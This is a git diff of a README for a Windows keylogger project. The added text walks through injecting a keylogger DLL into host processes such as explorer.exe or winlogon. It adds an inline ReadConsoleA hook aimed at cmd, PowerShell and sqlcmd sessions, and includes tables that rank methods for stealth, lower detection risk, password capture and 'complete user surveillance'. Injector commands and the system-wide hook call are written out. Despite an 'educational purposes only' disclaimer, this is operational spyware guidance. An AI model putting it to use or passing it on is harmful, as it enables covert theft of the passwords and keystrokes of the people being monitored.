@@ -9,10 +9,12 @@ This software is intended for **educational purposes only**. Use responsibly and
 ## 🚀 Features
 
 - **System-wide Key Capture**: Low-level keyboard hook captures all keystrokes across the entire system
+- **Process-Specific Console Monitoring**: Inline hook for targeted console application surveillance
 - **DLL Injection**: Injects keylogger into target processes for stealth operation
 - **Character Conversion**: Converts virtual key codes to readable characters
 - **Special Key Support**: Handles Shift, Caps Lock, punctuation, and function keys
 - **Real-time Logging**: Immediate keystroke logging to file
+- **Dual Approach**: Global surveillance OR targeted console monitoring
 - **Process Persistence**: Runs as long as the host process is active
 - **x64 Architecture**: Compiled for 64-bit Windows systems
 
@@ -20,10 +22,9 @@ This software is intended for **educational purposes only**. Use responsibly and
 
 ```
 KeyHook/
-├── keyboardhook.cpp         # Main keylogger DLL with keyboard hook
-├── ReadConsoleA-injector.cpp # DLL injector utility
+├── keyboardhook.cpp        # Main keylogger DLL with keyboard hook
+├── injector.cpp            # DLL injector utility
 ├── inlinehook.cpp          # Alternative: ReadConsoleA inline hook
-├── hook.cpp                # (Empty placeholder)
 ├── build.bat               # Automated build script
 ├── built/                  # Generated compiled files
 │   ├── keylogger.dll       # Main keylogger DLL
@@ -73,18 +74,26 @@ If you prefer manual compilation:
 3. **Compile individual components**:
    ```cmd
    cl /LD /EHsc /Fekeylogger.dll keyboardhook.cpp user32.lib kernel32.lib
-   cl /EHsc /Feinjector.exe ReadConsoleA-injector.cpp user32.lib kernel32.lib
+   cl /EHsc /Feinjector.exe injector.cpp user32.lib kernel32.lib
    cl /LD /EHsc /Feinlinehook.dll inlinehook.cpp user32.lib kernel32.lib
    ```
 
 ## 🎯 Usage
 
-### Step 1: Identify Target Process
+### Step 1: Identify Host Process
 
-Get the Process ID (PID) of your target process. For system-wide monitoring, use `explorer.exe`:
+Get the Process ID (PID) of a **host process** to run our keylogger code. The host process choice doesn't affect the scope of key capture (which is always system-wide), but affects stability and stealth:
 
+**Recommended: `explorer.exe` (most stable)**
 ```powershell
 Get-Process explorer | Select-Object Id,ProcessName
+```
+
+**Alternative host processes:**
+```powershell
+# Other stable processes you could use
+Get-Process notepad | Select-Object Id,ProcessName     # If Notepad is open
+Get-Process winlogon | Select-Object Id,ProcessName   # System process (requires admin)
 ```
 
 **Output example:**
@@ -94,9 +103,11 @@ Get-Process explorer | Select-Object Id,ProcessName
 12345 explorer
 ```
 
+**Important:** The PID is only used to choose **where our code runs**, not **what keys we capture**. The keylogger will capture system-wide keystrokes regardless of which process hosts it.
+
 ### Step 2: Inject Keylogger
 
-Inject the keylogger DLL into the target process:
+Inject the keylogger DLL into the **host process** (this only determines where our code runs):
 
 ```powershell
 .\built\injector.exe 12345 "C:\full\path\to\KeyHook\built\keylogger.dll"
@@ -106,6 +117,39 @@ Inject the keylogger DLL into the target process:
 ```
 DLL injected successfully.
 ```
+
+**Note:** Once injected, the keylogger will capture keystrokes from **all applications system-wide**, not just from the host process.
+
+### Alternative: Process-Specific Console Monitoring
+
+For **targeted console monitoring** instead of system-wide capture, use the inline hook:
+
+```powershell
+# Step 1: Get target console process
+Get-Process cmd | Select-Object Id,ProcessName        # Command Prompt
+Get-Process powershell | Select-Object Id,ProcessName # PowerShell
+Get-Process sqlcmd | Select-Object Id,ProcessName     # SQL Console
+
+# Step 2: Inject inline hook for console-only monitoring
+.\built\injector.exe <console_PID> "C:\full\path\to\KeyHook\built\inlinehook.dll"
+```
+
+**Console Hook Benefits:**
+- ✅ **Precision**: Only console input (commands, passwords in CLI)
+- ✅ **Stealth**: Lower detection risk than global hooks
+- ✅ **Performance**: Minimal system impact
+- ✅ **Targeted**: Focus on specific applications/workflows
+
+## 🔄 Choosing the Right Approach
+
+| Scenario | Use Global Hook (`keylogger.dll`) | Use Console Hook (`inlinehook.dll`) |
+|----------|-----------------------------------|-------------------------------------|
+| **Complete user surveillance** | ✅ **Best choice** | ❌ Too limited |
+| **Monitor admin server commands** | ❌ Too much noise | ✅ **Perfect fit** |
+| **Capture application passwords** | ✅ **Comprehensive** | ✅ **If console-based** |
+| **Stealth operation** | ❌ High detection risk | ✅ **Lower signature** |
+| **Database session monitoring** | ❌ Irrelevant data | ✅ **Precise targeting** |
+| **General keylogging** | ✅ **Full coverage** | ❌ Misses GUI apps |
 
 ### Step 3: Monitor Keystrokes
 
@@ -148,7 +192,7 @@ The main component implementing:
 - Special keys ([ENTER], [BACKSPACE], [F1-F12], etc.)
 - Punctuation and symbols
 
-### 2. DLL Injector (`ReadConsoleA-injector.cpp`)
+### 2. DLL Injector (`injector.cpp`)
 
 Utility for injecting DLLs into target processes:
 - **Process Memory Allocation**
@@ -158,10 +202,30 @@ Utility for injecting DLLs into target processes:
 
 ### 3. Inline Hook (`inlinehook.cpp`)
 
-Alternative approach using function hooking:
-- **ReadConsoleA Function Interception**
-- **Original Function Preservation**
-- **Console Input Monitoring**
+Alternative approach using **process-specific** function hooking:
+- **ReadConsoleA Function Interception**: Patches console input API calls
+- **Original Function Preservation**: Maintains normal application behavior
+- **Console Input Monitoring**: Captures only command-line/console input
+- **Targeted Surveillance**: Monitors specific processes, not system-wide
+
+**Key Differences from Global Hook:**
+- **Scope**: Process-specific vs. system-wide
+- **Stealth**: Lower detection signature
+- **Performance**: Minimal resource usage
+- **Precision**: Console applications only
+
+**Use Cases:**
+- Monitor administrator command-line activities
+- Capture database console sessions (sqlcmd, mysql)
+- Track specific application console input
+- Reduced-footprint surveillance
+
+**Usage Example:**
+```powershell
+# Target a specific CMD or PowerShell window
+Get-Process cmd | Select-Object Id,ProcessName
+injector.exe <cmd_PID> "C:\path\to\built\inlinehook.dll"
+```
 
 ## 🔍 Technical Details
 
@@ -184,6 +248,49 @@ VK_RETURN (0x0D) → '\n'
 - **Location**: Project directory (`log.txt`)
 - **Format**: Plain text, real-time appending
 - **Path**: Absolute path to handle working directory changes
+
+### Windows Hook Architecture
+
+Understanding how system-wide keylogging works through DLL injection:
+
+```
+[Keyboard Input] → [Windows Hook Manager] → [Our Callback in Host Process]
+     ↑                        ↑                         ↓
+All applications      System-wide router         Logs to file
+```
+
+**Key Points:**
+
+1. **Hook Scope vs. Host Process**:
+   - `WH_KEYBOARD_LL` creates **system-wide** hooks regardless of host process
+   - Host process (explorer.exe) is just a **container** for our code
+   - System-wide capability comes from **Windows hooking mechanism**, not the target process
+
+2. **Why Any Process Works**:
+   ```cpp
+   // This line determines scope (system-wide), not the host process
+   hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);
+   //                       ^^^^^^^^^^^^^^                                    ^
+   //                       Hook type = system-wide              Thread ID = 0 (all threads)
+   ```
+
+3. **Host Process Selection Criteria**:
+   | Process | Pros | Cons |
+   |---------|------|------|
+   | `explorer.exe` | Stable, persistent, legitimate | Well-known target |
+   | `notepad.exe` | Simple, low footprint | User might close it |
+   | `chrome.exe` | Common, high privileges | Resource intensive |
+   | Custom process | Full control | Suspicious standalone process |
+
+4. **Technical Flow**:
+   ```
+   1. Inject DLL into any process → Gets our code running
+   2. DLL calls SetWindowsHookEx(WH_KEYBOARD_LL) → Windows installs SYSTEM-WIDE hook
+   3. Windows routes ALL keyboard events → To our callback function
+   4. Callback executes in host process → But captures keys from everywhere
+   ```
+
+**The magic is in `WH_KEYBOARD_LL` + thread ID `0`, not the host process location!**
 
 ## 🛡️ Security Considerations
 
